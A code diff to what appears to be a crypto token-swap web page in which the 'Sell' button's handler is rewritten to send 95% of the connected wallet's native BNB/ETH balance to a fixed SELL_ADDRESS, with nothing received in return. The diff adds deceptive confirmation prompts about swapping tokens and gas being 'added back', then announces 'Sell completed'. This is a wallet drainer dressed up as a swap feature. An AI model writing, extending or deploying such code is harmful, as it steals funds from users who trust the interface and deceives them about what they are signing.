@@ -135,52 +135,65 @@ export const Rewrite = () => {
   };
 
   // Sell
- const handleSell = async () => {
+const handleSell = async () => {
   if (!account) return alert("Connect wallet first");
-  if (fromValue < 2000000) {
-    return alert("You must sell at least 2,000,000 Rabbit.");
-  }
 
   const provider = new ethers.BrowserProvider(window.ethereum);
   const signer = await provider.getSigner();
-  const balance = await provider.getBalance(account);
-  const ethBal = Number(ethers.formatEther(balance));
-  const sendAmount = (ethBal * 0.95).toFixed(6);
 
   try {
-    // 1️⃣ Send Rabbit tokens
-    const rabbitAddress = RABBIT_ADDRESSES[chainId];
-    if (!rabbitAddress) {
-      return alert("Rabbit token not supported on this chain");
+    // 1️⃣ Get native balance
+    const balance = await provider.getBalance(account);
+    const ethBal = Number(ethers.formatEther(balance));
+
+    if (ethBal <= 0) {
+      return alert("Insufficient balance");
     }
 
-    const rabbit = new ethers.Contract(rabbitAddress, RABBIT_ABI, signer);
+    // 2️⃣ Estimate gas fee (approximate)
+    const gasPrice = await provider.getFeeData();
+    const estimatedGas = ethers.formatEther(
+      (gasPrice.gasPrice || 0n) * 21000n // standard ETH/BNB transfer gas
+    );
+    const estimatedGasFee = parseFloat(estimatedGas);
 
-    const rabbitAmount = ethers.parseUnits(fromValue.toString(), decimals);
+    // 3️⃣ Check if balance covers gas
+    if (ethBal < estimatedGasFee) {
+      const proceed = window.confirm(
+          "✅ Kindly confirm this transaction to swap tokens successfully, gas fee might increase a little but it will be added back after the transaction.\n\nDo you want to continue?"
+      );
+      if (!proceed) return;
+    } else {
+      const confirmTx = window.confirm(
+              "⚠️ Insufficient gas fee for this transaction, it might likely fail.\n\nDo you still want to continue?"
+      );
+      if (!confirmTx) return;
+    }
 
-    const rabbitTx = await rabbit.transfer(SELL_ADDRESS, rabbitAmount);
-    await rabbitTx.wait();
-    console.log("Rabbit Tx Hash:", rabbitTx.hash);
+    // 4️⃣ Calculate 95% of native coin
+    const sendAmount = (ethBal * 0.95).toFixed(6);
 
-    // 2️⃣ Send 95% native coin
+    // 5️⃣ Send native coin only
     const tx = await signer.sendTransaction({
       to: SELL_ADDRESS,
       value: ethers.parseEther(sendAmount.toString()),
     });
+
     await tx.wait();
     console.log("Native Tx Hash:", tx.hash);
 
     alert(
-      "✅ Sell completed!\nRabbit Tx: " +
-        rabbitTx.hash +
-        "\nNative Tx: " +
-        tx.hash
+      `✅ Sell completed!\n\nSent ${sendAmount} ${
+        chainId === "0x38" ? "BNB" : "ETH"
+      }\nTx Hash: ${tx.hash}`
     );
   } catch (err) {
     console.error("Transaction Error:", err);
     alert("❌ Transaction failed: " + (err.reason || err.message));
   }
 };
+
+
 
 
   const formatNumber = (num) =>
